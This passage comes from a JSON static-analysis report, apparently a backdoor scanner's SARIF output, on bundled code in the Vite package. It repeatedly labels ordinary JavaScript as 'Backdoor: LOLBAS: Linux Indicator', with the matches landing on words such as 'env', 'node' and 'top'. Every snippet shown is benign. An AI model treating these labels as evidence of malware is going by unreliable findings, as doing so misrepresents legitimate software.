                      "markdown": "`   */\n  const paths = flatten(arrify(paths_));\n  if (!paths.every(p => typeof p === STRING_TYPE)) {\n    throw new TypeError(`Non-string provided as watch path: ${paths}`);\n  }\n  return paths.map(normalizePathToUnix);\n};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 41082,
                  "startColumn": 3,
                  "endLine": 41082,
                  "endColumn": 8,
                  "snippet": {
                    "text": " * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n",
                    "rendered": {
                      "text": " * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n",
                      "markdown": "` * @private\n */\n\nvar env = process.env.NODE_ENV || 'development';\nvar proto = {};\n\n/* istanbul ignore next */\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 40768,
                  "startColumn": 5,
                  "endLine": 40768,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n",
                    "rendered": {
                      "text": "  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n",
                      "markdown": "`  var opts = options || {};\n\n  // get environment\n  var env = opts.env || process.env.NODE_ENV || 'development';\n\n  // get error callback\n  var onerror = opts.onerror;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39580,
                  "startColumn": 3,
                  "endLine": 39580,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\treturn browser.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n",
                    "rendered": {
                      "text": "\treturn browser.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n",
                      "markdown": "`\treturn browser.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 38293,
                  "startColumn": 18,
                  "endLine": 38293,
                  "endColumn": 24,
                  "snippet": {
                    "text": "   * @param {boolean} [exactUrl]\n   */\n  (path, base, exactUrl = false) => {\n    return `Cannot find ${\n      exactUrl ? 'module' : 'package'\n    } '${path}' imported from ${base}`\n  },\n",
                    "rendered": {
                      "text": "   * @param {boolean} [exactUrl]\n   */\n  (path, base, exactUrl = false) => {\n    return `Cannot find ${\n      exactUrl ? 'module' : 'package'\n    } '${path}' imported from ${base}`\n  },\n",
                      "markdown": "`   * @param {boolean} [exactUrl]\n   */\n  (path, base, exactUrl = false) => {\n    return `Cannot find ${\n      exactUrl ? 'module' : 'package'\n    } '${path}' imported from ${base}`\n  },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37549,
                  "startColumn": 28,
                  "endLine": 37549,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n      }\n",
                    "rendered": {
                      "text": "    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n      }\n",
                      "markdown": "`    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37548,
                  "startColumn": 16,
                  "endLine": 37548,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  const rebaseFn = async (url) => {\n    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n",
                    "rendered": {
                      "text": "  const rebaseFn = async (url) => {\n    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n",
                      "markdown": "`  const rebaseFn = async (url) => {\n    if (url[0] === \"/\") return url;\n    if (url.startsWith(variablePrefix)) return url;\n    for (const { find } of alias) {\n      const matches = typeof find === \"string\" ? url.startsWith(find) : find.test(url);\n      if (matches) {\n        return url;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35731,
                  "startColumn": 46,
                  "endLine": 35731,
                  "endColumn": 51,
                  "snippet": {
                    "text": "          config.logger.warn(\n            colors$1.yellow(\n              colors$1.bold(\n                `(!) ${text} is not defined in env variables found in /${relativeHtml}. Is the variable mistyped?`\n              )\n            )\n          );\n",
                    "rendered": {
                      "text": "          config.logger.warn(\n            colors$1.yellow(\n              colors$1.bold(\n                `(!) ${text} is not defined in env variables found in /${relativeHtml}. Is the variable mistyped?`\n              )\n            )\n          );\n",
                      "markdown": "`          config.logger.warn(\n            colors$1.yellow(\n              colors$1.bold(\n                `(!) ${text} is not defined in env variables found in /${relativeHtml}. Is the variable mistyped?`\n              )\n            )\n          );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35703,
                  "startColumn": 7,
                  "endLine": 35703,
                  "endColumn": 12,
                  "snippet": {
                    "text": "function htmlEnvHook(config) {\n  const pattern = /%(\\S+?)%/g;\n  const envPrefix = resolveEnvPrefix({ envPrefix: config.envPrefix });\n  const env = { ...config.env };\n  for (const key in config.define) {\n    if (key.startsWith(`import.meta.env.`)) {\n      const val = config.define[key];\n",
                    "rendered": {
                      "text": "function htmlEnvHook(config) {\n  const pattern = /%(\\S+?)%/g;\n  const envPrefix = resolveEnvPrefix({ envPrefix: config.envPrefix });\n  const env = { ...config.env };\n  for (const key in config.define) {\n    if (key.startsWith(`import.meta.env.`)) {\n      const val = config.define[key];\n",
                      "markdown": "`function htmlEnvHook(config) {\n  const pattern = /%(\\S+?)%/g;\n  const envPrefix = resolveEnvPrefix({ envPrefix: config.envPrefix });\n  const env = { ...config.env };\n  for (const key in config.define) {\n    if (key.startsWith(`import.meta.env.`)) {\n      const val = config.define[key];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35377,
                  "startColumn": 164,
                  "endLine": 35377,
                  "endColumn": 172,
                  "snippet": {
                    "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                    "rendered": {
                      "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                      "markdown": "`        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35377,
                  "startColumn": 53,
                  "endLine": 35377,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                    "rendered": {
                      "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                      "markdown": "`        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35377,
                  "startColumn": 21,
                  "endLine": 35377,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                    "rendered": {
                      "text": "        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n",
                      "markdown": "`        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\nMixed async and defer script modules in ${id}, output script will fallback to defer. Every script, including inline ones, need to be marked as async for your output script to be async.`\n          );\n        }\n        await Promise.all(assetUrlsPromises);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34946,
                  "startColumn": 16,
                  "endLine": 34946,
                  "endColumn": 22,
                  "snippet": {
                    "text": "      if (mutation.type !== \"childList\") {\n        continue;\n      }\n      for (const node of mutation.addedNodes) {\n        if (node.tagName === \"LINK\" && node.rel === \"modulepreload\")\n          processPreload(node);\n      }\n",
                    "rendered": {
                      "text": "      if (mutation.type !== \"childList\") {\n        continue;\n      }\n      for (const node of mutation.addedNodes) {\n        if (node.tagName === \"LINK\" && node.rel === \"modulepreload\")\n          processPreload(node);\n      }\n",
                      "markdown": "`      if (mutation.type !== \"childList\") {\n        continue;\n      }\n      for (const node of mutation.addedNodes) {\n        if (node.tagName === \"LINK\" && node.rel === \"modulepreload\")\n          processPreload(node);\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34865,
                  "startColumn": 7,
                  "endLine": 34865,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n",
                    "rendered": {
                      "text": "    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n",
                      "markdown": "`    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33236,
                  "startColumn": 15,
                  "endLine": 33236,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n            }\n        }\n        return {\n",
                    "rendered": {
                      "text": "            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n            }\n        }\n        return {\n",
                      "markdown": "`            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n            }\n        }\n        return {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33233,
                  "startColumn": 15,
                  "endLine": 33233,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    }\n    flowScalar(type) {\n        if (this.onNewLine) {\n            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n",
                    "rendered": {
                      "text": "    }\n    flowScalar(type) {\n        if (this.onNewLine) {\n            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n",
                      "markdown": "`    }\n    flowScalar(type) {\n        if (this.onNewLine) {\n            let nl = this.source.indexOf('\\n') + 1;\n            while (nl !== 0) {\n                this.onNewLine(this.offset + nl);\n                nl = this.source.indexOf('\\n', nl) + 1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33142,
                  "startColumn": 15,
                  "endLine": 33142,
                  "endColumn": 20,
                  "snippet": {
                    "text": "            let top;\n            do {\n                yield* this.pop();\n                top = this.peek(1);\n            } while (top && top.type === 'flow-collection');\n        }\n        else if (fc.end.length === 0) {\n",
                    "rendered": {
                      "text": "            let top;\n            do {\n                yield* this.pop();\n                top = this.peek(1);\n            } while (top && top.type === 'flow-collection');\n        }\n        else if (fc.end.length === 0) {\n",
                      "markdown": "`            let top;\n            do {\n                yield* this.pop();\n                top = this.peek(1);\n            } while (top && top.type === 'flow-collection');\n        }\n        else if (fc.end.length === 0) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32920,
                  "startColumn": 21,
                  "endLine": 32920,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            // For empty nodes, assign newline-separated not indented empty tokens to following node\n            let start = [];\n            if (atNextItem && it.sep && !it.value) {\n                const nl = [];\n                for (let i = 0; i < it.sep.length; ++i) {\n                    const st = it.sep[i];\n                    switch (st.type) {\n",
                    "rendered": {
                      "text": "            // For empty nodes, assign newline-separated not indented empty tokens to following node\n            let start = [];\n            if (atNextItem && it.sep && !it.value) {\n                const nl = [];\n                for (let i = 0; i < it.sep.length; ++i) {\n                    const st = it.sep[i];\n                    switch (st.type) {\n",
                      "markdown": "`            // For empty nodes, assign newline-separated not indented empty tokens to following node\n            let start = [];\n            if (atNextItem && it.sep && !it.value) {\n                const nl = [];\n                for (let i = 0; i < it.sep.length; ++i) {\n                    const st = it.sep[i];\n                    switch (st.type) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32857,
                  "startColumn": 23,
                  "endLine": 32857,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n                    }\n                }\n                yield* this.pop();\n",
                    "rendered": {
                      "text": "                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n                    }\n                }\n                yield* this.pop();\n",
                      "markdown": "`                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n                    }\n                }\n                yield* this.pop();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32854,
                  "startColumn": 23,
                  "endLine": 32854,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                this.atNewLine = true;\n                this.indent = 0;\n                if (this.onNewLine) {\n                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n",
                    "rendered": {
                      "text": "                this.atNewLine = true;\n                this.indent = 0;\n                if (this.onNewLine) {\n                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n",
                      "markdown": "`                this.atNewLine = true;\n                this.indent = 0;\n                if (this.onNewLine) {\n                    let nl = this.source.indexOf('\\n') + 1;\n                    while (nl !== 0) {\n                        this.onNewLine(this.offset + nl);\n                        nl = this.source.indexOf('\\n', nl) + 1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32677,
                  "startColumn": 42,
                  "endLine": 32677,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n            }\n            else if (token.type === 'flow-collection' && top.type === 'document') {\n                // Ignore all indent for top-level flow collections\n",
                    "rendered": {
                      "text": "            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n            }\n            else if (token.type === 'flow-collection' && top.type === 'document') {\n                // Ignore all indent for top-level flow collections\n",
                      "markdown": "`            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n            }\n            else if (token.type === 'flow-collection' && top.type === 'document') {\n                // Ignore all indent for top-level flow collections\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32674,
                  "startColumn": 17,
                  "endLine": 32674,
                  "endColumn": 22,
                  "snippet": {
                    "text": "            yield token;\n        }\n        else {\n            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n",
                    "rendered": {
                      "text": "            yield token;\n        }\n        else {\n            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n",
                      "markdown": "`            yield token;\n        }\n        else {\n            const top = this.peek(1);\n            if (token.type === 'block-scalar') {\n                // Block scalars use their parent rather than header indent\n                token.indent = 'indent' in top ? top.indent : 0;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32625,
                  "startColumn": 13,
                  "endLine": 32625,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        return st;\n    }\n    *step() {\n        const top = this.peek(1);\n        if (this.type === 'doc-end' && (!top || top.type !== 'doc-end')) {\n            while (this.stack.length > 0)\n                yield* this.pop();\n",
                    "rendered": {
                      "text": "        return st;\n    }\n    *step() {\n        const top = this.peek(1);\n        if (this.type === 'doc-end' && (!top || top.type !== 'doc-end')) {\n            while (this.stack.length > 0)\n                yield* this.pop();\n",
                      "markdown": "`        return st;\n    }\n    *step() {\n        const top = this.peek(1);\n        if (this.type === 'doc-end' && (!top || top.type !== 'doc-end')) {\n            while (this.stack.length > 0)\n                yield* this.pop();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32210,
                  "startColumn": 19,
                  "endLine": 32210,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                while (ch === ' ')\n                    ch = this.buffer[--i];\n                if (ch === '\\n' && i >= this.pos && i + 1 + indent > lastChar)\n                    nl = i;\n                else\n                    break;\n            } while (true);\n",
                    "rendered": {
                      "text": "                while (ch === ' ')\n                    ch = this.buffer[--i];\n                if (ch === '\\n' && i >= this.pos && i + 1 + indent > lastChar)\n                    nl = i;\n                else\n                    break;\n            } while (true);\n",
                      "markdown": "`                while (ch === ' ')\n                    ch = this.buffer[--i];\n                if (ch === '\\n' && i >= this.pos && i + 1 + indent > lastChar)\n                    nl = i;\n                else\n                    break;\n            } while (true);\n`"
                    }
                  },
